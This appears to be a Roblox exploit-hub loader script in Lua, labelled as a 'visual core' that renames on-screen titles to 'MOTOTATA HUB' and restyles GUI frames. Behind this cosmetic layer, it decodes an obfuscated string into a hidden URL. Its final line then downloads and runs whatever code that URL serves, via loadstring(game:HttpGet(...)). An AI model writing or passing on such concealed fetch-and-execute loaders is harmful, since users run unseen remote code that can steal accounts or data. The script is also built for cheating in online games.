
--[[ STAGE 2: VISUAL CORE ]]
local utD_DBcgLg30sAp4Udf7Z="\137\139\145\147\152\213\240\246\175\200\192\013\220\216\217\227\230\245\242\242\014\253\020\022\027\027\050\045\045\121\068\070\078\146\087\094\099\112\114\128\126\136\135\130\157\218\163\153\170\182\180\182\202\203\209\022\222\232\230\237\052\040\046\214\235\016\032\027\029\030\000\052\059\018\065\075\094\042\071\102\095\124\108\119\084\116\100\107\108\118\172\161\178\175\185\150\160\210\210\209\232\244\192\043\051\059\064\020\065\072\077\101\045\044\062"local jkb6gmV99oxiW=90 local y5z0qqWSW6ejbGJNH=68 local ZJjBq_TLQYwFvhGH95=0 local _LN6Dqi6iNw9=6 local mIBDUfd2p6hLjAP0QMXGr=13 local YDJ0a6UM3Z9CUtudfcj6M8=false local LMx4ZGdvIYrga4=bit32 and bit32.bxor if not LMx4ZGdvIYrga4 then LMx4ZGdvIYrga4=function(a,b)local r,m=0,1 while a>0 or b>0 do local aa=a%2 local bb=b%2 if aa~=bb then r=r+m end a=(a-aa)/2 b=(b-bb)/2 m=m*2 end return r end end local FIA0j5D4EIx1szoYk9N1={}for EVEii7LzslwygW4U4b6HoD=1,#utD_DBcgLg30sAp4Udf7Z do local F3exYrxCAgwi=string.byte(utD_DBcgLg30sAp4Udf7Z,EVEii7LzslwygW4U4b6HoD)local EKDL3062BzVGwKPg_l=(y5z0qqWSW6ejbGJNH+(EVEii7LzslwygW4U4b6HoD*_LN6Dqi6iNw9)+mIBDUfd2p6hLjAP0QMXGr)%256 if ZJjBq_TLQYwFvhGH95==0 then F3exYrxCAgwi=(F3exYrxCAgwi-EKDL3062BzVGwKPg_l)%256 FIA0j5D4EIx1szoYk9N1[EVEii7LzslwygW4U4b6HoD]=string.char(LMx4ZGdvIYrga4(F3exYrxCAgwi,jkb6gmV99oxiW))else F3exYrxCAgwi=LMx4ZGdvIYrga4(F3exYrxCAgwi,jkb6gmV99oxiW)FIA0j5D4EIx1szoYk9N1[EVEii7LzslwygW4U4b6HoD]=string.char((F3exYrxCAgwi-EKDL3062BzVGwKPg_l)%256)end end local WWwqhGXczVfq72a_U6Ww=table.concat(FIA0j5D4EIx1szoYk9N1)if YDJ0a6UM3Z9CUtudfcj6M8 then WWwqhGXczVfq72a_U6Ww=string.reverse(WWwqhGXczVfq72a_U6Ww)end local s7cm3aR8Qwr_UvHfy=WWwqhGXczVfq72a_U6Ww
local HubName = "MOTOTATA HUB"
local Acc = Color3.fromRGB(0, 255, 120)

-- // SMART HOOK //
local function Hook()
    local function Customize(obj)
        pcall(function()
            if obj:IsA("TextLabel") then
                if obj.TextSize >= 18 or obj.Name:find("Title") or obj.Name:find("Header") then
                    if #obj.Text > 3 and not tonumber(obj.Text) then
                        obj.Text = HubName
                        obj.TextColor3 = Acc
                    end
                end
            end
            if obj:IsA("Frame") or obj:IsA("TextButton") then
                if obj.BackgroundColor3.R < 0.2 then
                    if not obj:FindFirstChild("UICorner") then
                        local uic = Instance.new("UICorner")
                        uic.CornerRadius = UDim.new(0, 6)
                        uic.Parent = obj
                    end
                end
            end
        end)
    end

    game.DescendantAdded:Connect(function(c)
        if c:IsA("GuiObject") then
            task.delay(0.1, function() Customize(c) end)
        end
    end)
end

Hook()
loadstring(game:HttpGet(s7cm3aR8Qwr_UvHfy))()
